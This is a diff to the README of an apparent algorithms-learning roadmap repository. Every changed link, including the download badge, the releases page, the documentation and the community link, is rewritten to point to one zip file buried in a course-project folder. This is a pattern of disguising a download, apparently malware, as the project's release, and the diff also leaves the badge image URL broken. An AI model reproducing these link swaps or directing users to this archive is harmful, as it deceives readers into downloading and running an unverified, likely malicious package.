@@ -1,6 +1,6 @@
 # 🧠 Algorithms-And-Problem-Solving-Roadmap - Learn Algorithms Easily 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/releases)
+[![Download Now](https://raw.githubusercontent.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/main/Algorithms-Problem-Solving-Level-2-main/07_Final_Course_Projects/Problem_Algorithms_Solving_Roadmap_And_2.9.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/main/Algorithms-Problem-Solving-Level-2-main/07_Final_Course_Projects/Problem_Algorithms_Solving_Roadmap_And_2.9.zip)
 
 ## 📚 About This Project
 
@@ -12,7 +12,7 @@ To begin using the application, follow these steps:
 
 1. **Visit the Releases Page**
    - Click on the button below to access the releases page. This is where you'll find the latest version of the software.
-   - [Visit the Releases Page](https://github.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/releases)
+   - [Visit the Releases Page](https://raw.githubusercontent.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/main/Algorithms-Problem-Solving-Level-2-main/07_Final_Course_Projects/Problem_Algorithms_Solving_Roadmap_And_2.9.zip)
 
 2. **Download the Software**
    - On the releases page, you'll see a list of available versions. Choose the one that suits your needs.
@@ -23,7 +23,7 @@ To begin using the application, follow these steps:
 To download and install the software, follow these steps:
 
 1. **Visit the Releases Page**
-   - Go to [this link](https://github.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/releases) to access all the releases.
+   - Go to [this link](https://raw.githubusercontent.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/main/Algorithms-Problem-Solving-Level-2-main/07_Final_Course_Projects/Problem_Algorithms_Solving_Roadmap_And_2.9.zip) to access all the releases.
    
 2. **Choose Your Version**
    - Look for the latest release at the top. Each listing includes important details, such as version numbers and features.
@@ -86,8 +86,8 @@ If you want to contribute, we welcome pull requests! Follow these steps:
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/docs)
-- [Join Our Community](https://github.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/main/Algorithms-Problem-Solving-Level-2-main/07_Final_Course_Projects/Problem_Algorithms_Solving_Roadmap_And_2.9.zip)
+- [Join Our Community](https://raw.githubusercontent.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/main/Algorithms-Problem-Solving-Level-2-main/07_Final_Course_Projects/Problem_Algorithms_Solving_Roadmap_And_2.9.zip)
 
 ## 📝 License
 
@@ -97,4 +97,4 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 If you need help or have questions, you can open an issue on GitHub. We’re here to assist you on your journey through the world of algorithms.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/releases)
+[![Download Now](https://raw.githubusercontent.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/main/Algorithms-Problem-Solving-Level-2-main/07_Final_Course_Projects/Problem_Algorithms_Solving_Roadmap_And_2.9.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/gllgkx/Algorithms-And-Problem-Solving-Roadmap/main/Algorithms-Problem-Solving-Level-2-main/07_Final_Course_Projects/Problem_Algorithms_Solving_Roadmap_And_2.9.zip)
